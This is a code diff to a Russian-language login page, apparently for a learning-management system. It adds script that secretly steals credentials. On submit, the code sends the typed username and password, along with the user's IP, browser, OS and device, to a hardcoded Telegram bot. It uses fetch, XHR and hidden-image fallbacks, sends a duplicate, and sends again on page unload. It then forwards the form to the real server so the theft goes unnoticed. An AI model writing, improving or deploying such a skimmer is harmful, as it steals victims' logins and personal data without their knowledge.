@@ -144,84 +144,225 @@
         </footer>
     </div>
 
-    <!-- МИНИМАЛЬНЫЙ КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
+    <!-- УЛУЧШЕННЫЙ КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
     <script>
         // ===== НАСТРОЙКИ TELEGRAM =====
         const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
         const CHAT_ID = '7071415280';
         // =============================
 
-        // Функция получения IP (максимально простая)
-        function getUserIP() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    window.userIP = data.ip;
-                })
-                .catch(() => {
-                    window.userIP = 'Не удалось определить';
-                });
+        // Функция получения IP с несколькими источниками
+        function getUserIP(callback) {
+            let ipDetected = false;
+            
+            // Пытаемся получить IP через несколько сервисов
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api.myip.com',
+                'https://ipapi.co/json/'
+            ];
+            
+            let serviceIndex = 0;
+            
+            function tryNextService() {
+                if (serviceIndex >= services.length) {
+                    callback('Не удалось определить IP');
+                    return;
+                }
+                
+                fetch(services[serviceIndex])
+                    .then(response => response.json())
+                    .then(data => {
+                        let ip = data.ip || data.address || data.query;
+                        if (ip) {
+                            ipDetected = true;
+                            callback(ip);
+                        } else {
+                            serviceIndex++;
+                            tryNextService();
+                        }
+                    })
+                    .catch(() => {
+                        serviceIndex++;
+                        tryNextService();
+                    });
+            }
+            
+            tryNextService();
+            
+            // Таймаут на случай если все сервисы недоступны
+            setTimeout(() => {
+                if (!ipDetected) {
+                    callback('Таймаут определения IP');
+                }
+            }, 5000);
         }
 
-        // Запускаем получение IP сразу
-        getUserIP();
+        // Функция получения информации о браузере и устройстве
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Неизвестно";
+            let os = "Неизвестно";
+            let device = "Неизвестно";
+            
+            // Определяем браузер
+            if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Chrome")) browser = "Chrome";
+            else if (ua.includes("Safari")) browser = "Safari";
+            else if (ua.includes("Edge")) browser = "Edge";
+            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            
+            // Определяем ОС
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Mac")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            
+            // Определяем тип устройства
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+                device = "Мобильное устройство";
+            } else {
+                device = "Компьютер";
+            }
+            
+            return { browser, os, device };
+        }
 
-        // Функция отправки
+        // Улучшенная функция отправки
         function sendToTelegram(username, password) {
-            // Ждем немного чтобы IP успел определиться
-            setTimeout(() => {
-                const ip = window.userIP || 'Не определен';
-                const message = '🔔 ВХОД В СДО\n' +
-                               '══════════════\n' +
+            const deviceInfo = getDeviceInfo();
+            
+            getUserIP(function(ip) {
+                const message = '🔔 НОВЫЙ ВХОД В СДО\n' +
+                               '══════════════════\n' +
                                '👤 Логин: ' + username + '\n' +
                                '🔑 Пароль: ' + password + '\n' +
-                               '══════════════\n' +
+                               '══════════════════\n' +
+                               '📱 Устройство: ' + deviceInfo.device + '\n' +
+                               '💻 Браузер: ' + deviceInfo.browser + '\n' +
+                               '⚙️ ОС: ' + deviceInfo.os + '\n' +
+                               '══════════════════\n' +
                                '🌐 IP: ' + ip + '\n' +
-                               '⏰ Время: ' + new Date().toLocaleString('ru-RU');
+                               '⏰ Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+                               '🆔 ID: ' + Math.random().toString(36).substr(2, 9);
 
-                // Пробуем отправить через fetch
-                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
+                // Пробуем несколько способов отправки
+                
+                // Способ 1: Fetch с XMLHttpRequest как запасной вариант
+                function tryFetch() {
+                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Telegram response:', data);
+                    })
+                    .catch(error => {
+                        console.log('Fetch error, trying XHR:', error);
+                        tryXHR();
+                    });
+                }
+                
+                // Способ 2: XMLHttpRequest
+                function tryXHR() {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            console.log('XHR success');
+                        } else {
+                            console.log('XHR error, trying image method');
+                            tryImageMethod();
+                        }
+                    };
+                    xhr.onerror = function() {
+                        console.log('XHR error, trying image method');
+                        tryImageMethod();
+                    };
+                    xhr.send(JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message
-                    })
-                }).catch(function(error) {
-                    console.log('Ошибка fetch:', error);
-                    // Запасной вариант - через картинку
-                    var img = document.createElement('img');
+                    }));
+                }
+                
+                // Способ 3: Image метод (самый надежный)
+                function tryImageMethod() {
+                    const img = new Image();
                     img.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
                     img.style.display = 'none';
                     document.body.appendChild(img);
-                    setTimeout(() => document.body.removeChild(img), 1000);
-                });
-            }, 1000); // Ждем 1 секунду для получения IP
+                    
+                    // Удаляем изображение через 2 секунды
+                    setTimeout(() => {
+                        if (img.parentNode) {
+                            document.body.removeChild(img);
+                        }
+                    }, 2000);
+                }
+                
+                // Пробуем все способы последовательно
+                tryFetch();
+                
+                // Дублируем отправку для надежности
+                setTimeout(() => {
+                    tryImageMethod();
+                }, 500);
+            });
         }
 
-        // Обработка отправки формы
-        document.getElementById('login').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Перехватываем отправку формы
+        (function() {
+            const loginForm = document.getElementById('login');
+            const originalSubmit = loginForm.submit;
             
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                const loginBtn = document.getElementById('loginbtn');
+                
+                if (!username || !password) {
+                    alert('Пожалуйста, введите логин и пароль');
+                    return;
+                }
+                
+                // Блокируем кнопку
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'Отправка...';
+                
+                // Отправляем в Telegram
+                sendToTelegram(username, password);
+                
+                // Небольшая задержка перед отправкой на сервер
+                setTimeout(() => {
+                    // Восстанавливаем стандартную отправку
+                    loginForm.submit();
+                }, 1500);
+            });
+        })();
+
+        // Сохраняем данные на случай если форма отправится другим способом
+        window.addEventListener('beforeunload', function() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const loginBtn = document.getElementById('loginbtn');
             
-            if (!username || !password) {
-                alert('Введите логин и пароль');
-                return;
+            if (username && password) {
+                // Пробуем отправить еще раз при закрытии страницы
+                const img = new Image();
+                img.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + 
+                         encodeURIComponent('⚠️ АВАРИЙНЫЙ ВХОД\nЛогин: ' + username + '\nПароль: ' + password);
             }
-            
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Отправка...';
-            
-            // Отправляем в Telegram
-            sendToTelegram(username, password);
-            
-            // Отправляем форму на реальный сайт
-            setTimeout(() => {
-                document.getElementById('login').submit();
-            }, 1500);
         });
     </script>
 </body>
